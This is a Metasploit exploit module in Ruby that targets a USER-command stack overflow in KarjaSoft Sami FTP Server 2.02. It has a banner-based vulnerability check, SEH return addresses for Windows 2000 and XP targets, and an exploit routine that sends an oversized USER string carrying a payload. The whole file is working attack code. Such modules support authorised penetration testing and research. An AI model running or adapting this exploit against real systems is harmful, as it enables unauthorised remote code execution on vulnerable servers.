##
# $Id: sami_ftpd_user.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'KarjaSoft Sami FTP Server v2.02 USER Overflow',
			'Description'	=> %q{
					This module exploits the KarjaSoft Sami FTP Server version 2.02
				by sending an excessively long USER string. The stack is overwritten
				when the administrator attempts to view the FTP logs. Therefore, this exploit
				is passive and requires end-user interaction. Keep this in mind when selecting
				payloads. When the server is restarted, it will re-execute the exploit until
				the logfile is manually deleted via the file system.
			},
			'Author'	=> [ 'patrick' ],
			'Arch'		=> [ ARCH_X86 ],
			'License'	=> MSF_LICENSE,
			'Version'	=> '$Revision: 9179 $',
			'Stance'	=> Msf::Exploit::Stance::Passive,
			'References'	=>
				[
					# This exploit appears to have been reported multiple times.
					[ 'CVE', '2006-0441'],
					[ 'CVE', '2006-2212'],
					[ 'OSVDB', '25670'],
					[ 'BID', '16370'],
					[ 'BID', '22045'],
					[ 'BID', '17835'],
					[ 'URL', 'http://www.milw0rm.com/exploits/1448'],
					[ 'URL', 'http://www.milw0rm.com/exploits/1452'],
					[ 'URL', 'http://www.milw0rm.com/exploits/1462'],
					[ 'URL', 'http://www.milw0rm.com/exploits/3127'],
					[ 'URL', 'http://www.milw0rm.com/exploits/3140'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Platform' 	=> ['win'],
			'Privileged'	=> false,
			'Payload'	=>
				{
					'Space'			=> 300,
					'BadChars'		=> "\x00\x0a\x0d\x20\xff",
					'StackAdjustment'	=> -3500,
				},
			'Targets' 	=>
				[
					[ 'Windows 2000 Pro All - English', { 'Ret' => 0x75022ac4 } ], # p/p/r ws2help.dll
					[ 'Windows 2000 Pro All - Italian', { 'Ret' => 0x74fd11a9 } ], # p/p/r ws2help.dll
					[ 'Windows 2000 Pro All - French',  { 'Ret' => 0x74fa12bc } ], # p/p/r ws2help.dll
					[ 'Windows XP SP0/1 - English',     { 'Ret' => 0x71aa32ad } ], # p/p/r ws2help.dll
				],
			'DisclosureDate' => 'Jan 24 2006'))

		register_options(
			[
				Opt::RPORT(21),
			], self.class)
	end

	def check
		connect
		banner = sock.get(-1,3)
		disconnect

		if (banner =~ /Sami FTP Server 2.0.2/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		sploit = Rex::Text.rand_text_alphanumeric(596) + generate_seh_payload(target.ret)

		login = "USER #{sploit}\r\n"
		login << "PASS " + Rex::Text.rand_char(payload_badchars)

		sock.put(login + "\r\n")

		handler
		disconnect
	end

end
